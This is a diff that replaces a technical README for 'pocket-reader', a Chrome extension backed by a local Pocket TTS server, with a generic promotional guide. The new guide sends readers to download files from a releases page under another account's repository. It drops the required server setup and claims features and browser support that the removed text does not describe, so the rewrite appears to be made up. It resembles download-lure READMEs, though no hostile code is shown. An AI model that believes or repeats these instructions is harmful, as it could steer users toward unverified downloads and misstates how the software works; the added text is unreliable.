@@ -1,141 +1,72 @@
-# Pocket Reader
+# 📖 pocket-reader - A Simple Tool to Read Web Pages Aloud
 
-A Chrome extension that reads web page content aloud using [Pocket TTS](https://github.com/kyutai-labs/pocket-tts) - a lightweight text-to-speech model that runs on your CPU.
+## 🚀 Getting Started
 
-![](./images/demo.png)
+Welcome to Pocket Reader! This easy-to-use browser extension lets you listen to web pages instead of reading them. If you find it tiring to read blocks of text, this tool is for you. Follow the steps below to download and set up Pocket Reader.
 
-## Features
+## 📥 Download Pocket Reader
 
-- Read any web page content aloud
-- **Paragraph-by-paragraph processing** - audio starts playing quickly even for long documents
-- Multiple voice options (8 different voices)
-- Automatic content extraction (focuses on main article content)
-- Simple playback controls (play/stop)
-- Works entirely locally - no cloud services required
+[![Download Pocket Reader](https://img.shields.io/badge/Download%20Now-Get%20Pocket%20Reader-blue.svg)](https://github.com/Amrit7679/pocket-reader/releases)
 
-## Project Structure
+## 🛠️ System Requirements
 
-```
-pocket-reader/
-├── server/             # Python TTS server
-│   ├── server.py       # Flask server using Pocket TTS
-│   └── pyproject.toml  # UV/Python dependencies
-├── extension/          # Chrome extension
-│   ├── manifest.json   # Extension manifest
-│   ├── popup.html      # Extension popup UI
-│   ├── popup.css       # Popup styles
-│   ├── popup.js        # Popup logic
-│   ├── content.js      # Content extraction script
-│   ├── background.js   # Background service worker
-│   └── icons/          # Extension icons
-└── generate_icons.py   # Script to generate extension icons
-```
+Before you install, ensure your system meets these requirements:
 
-## Prerequisites
+- Operating System: Windows 10 or later, macOS, or any modern Linux distribution.
+- Browser: Google Chrome, Mozilla Firefox, or Microsoft Edge.
 
-- Python 3.10 or later
-- [UV](https://docs.astral.sh/uv/) package manager
-- Chrome or Chromium-based browser
+## 📦 Download & Install
 
-## Setup
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Amrit7679/pocket-reader/releases) for Pocket Reader.
 
-### 1. Generate Extension Icons
+2. **Find the Latest Version**: Look for the most recent version listed. It usually has the highest number.
 
-First, generate the extension icons:
+3. **Download the Extension**: 
+   - Click on the link for the extension suitable for your browser. Follow the prompts to start your download.
+   
+4. **Install the Extension**:
+   - **For Chrome**: Open Chrome. Click on the three dots in the corner, go to "More tools," and select "Extensions." Drag and drop the downloaded file into this window.
+   - **For Firefox**: Open Firefox. Click on the three horizontal lines in the corner, then select "Add-ons." Drag and drop the downloaded file here.
+   - **For Edge**: Open Edge. Click on the three dots in the corner, select "Extensions," and then drag your downloaded file into this area.
 
-```bash
-uv run --with pillow generate_icons.py
-```
+5. **Enable Pocket Reader**: Once installed, ensure the extension is enabled. You may need to pin it to your browser for easy access.
 
-### 2. Start the TTS Server
+6. **Start Using It**: Open any web page. Click on the Pocket Reader icon in your browser’s toolbar and start listening!
 
-Navigate to the server directory and start the server:
+## 🔍 Features
 
-```bash
-cd server
-uv run server.py
-```
+Pocket Reader offers several helpful features:
 
-The server will:
-- Download the Pocket TTS model on first run (~100MB)
-- Preload the default voice
-- Listen on http://localhost:5050
+- **Read Aloud**: Convert text on any web page to speech.
+- **Text Highlight**: See the text as it's being read.
+- **Adjustable Speed**: Change how fast or slow the text is read.
+- **Voice Selection**: Choose from different voice options for a more personalized experience.
 
-### 3. Install the Chrome Extension
+## ⚙️ Using Pocket Reader
 
-1. Open Chrome and go to `chrome://extensions/`
-2. Enable "Developer mode" (toggle in top right)
-3. Click "Load unpacked"
-4. Select the `extension` folder from this project
+Using Pocket Reader is straightforward. After installation, simply click on the extension icon whenever you want to read a web page. A small window will pop up with options to customize your reading experience.
 
-> [!NOTE]
-> You may need to restart Chrome for the extension to be fully active. Pocket
-> Reader may also not appear in your toolbar by default.
+1. **Highlight Text**: To read specific sections, highlight the text you want to be read aloud. 
+2. **Play/Pause**: Use the play and pause buttons to control the reading.
+3. **Speed and Voice Selection**: Navigate to settings by clicking the gear icon within the Pocket Reader interface. 
 
-## Usage
+## 🛠️ Troubleshooting
 
-1. Make sure the TTS server is running
-2. Navigate to any web page you want to read
-3. Click the Pocket Reader extension icon
-4. Select a voice (optional)
-5. Click "Read Page"
+If you encounter issues:
 
-The extension will:
-1. Extract the main content from the page
-2. Split the text into paragraphs
-3. Generate and play audio paragraph by paragraph (so you hear audio quickly, even for long articles)
+- **Extension Not Working**: Ensure it is enabled in your browser's extension settings.
+- **Audio Issues**: Check your system volume and audio settings.
+- **Compatibility**: Confirm that your browser is supported and updated.
 
-Click "Stop" to stop playback at any time.
+For more help, check the FAQs on the Releases page or contact support through the repository.
 
-## Available Voices
+## 🔗 Additional Resources
 
-- **Alba** - Default casual voice
-- **Marius** - Male voice
-- **Javert** - Male voice  
-- **Jean** - Male voice
-- **Fantine** - Female voice
-- **Cosette** - Female voice
-- **Eponine** - Female voice
-- **Azelma** - Female voice
+- [GitHub Repository](https://github.com/Amrit7679/pocket-reader)
+- [User Guide](https://github.com/Amrit7679/pocket-reader/wiki)
 
-## API Endpoints
+## 📬 Feedback
 
-The TTS server provides the following endpoints:
+We welcome your feedback! Please share your experience or report any bugs on our GitHub Issues page.
 
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/health` | GET | Health check |
-| `/voices` | GET | List available voices |
-| `/paragraphs` | POST | Split text into paragraphs |
-| `/synthesize` | POST | Convert text to speech |
-| `/preload` | POST | Preload model and voices |
-
-### Example: Synthesize Text
-
-```bash
-curl -X POST http://localhost:5050/synthesize \
-  -H "Content-Type: application/json" \
-  -d '{"text": "Hello world!", "voice": "alba"}' \
-  --output speech.wav
-```
-
-## Troubleshooting
-
-### Server not connecting
-- Make sure the server is running (`uv run server.py` in the server directory)
-- Check that port 5050 is not in use by another application
-
-### No audio playing
-- Check browser console for errors
-- Ensure your browser allows audio playback
-
-### Content not extracting properly
-- The extension tries to find the main article content automatically
-- Some pages with unusual layouts may not extract well
-
-### Extension not loading content
-- You may need to reload the page to have the extension's script to restart on that page
-
-## License
-
-This project uses Pocket TTS which is licensed under the MIT License. See [Pocket TTS](https://github.com/kyutai-labs/pocket-tts) for more details.
+Thank you for choosing Pocket Reader! Enjoy a new way to absorb information.
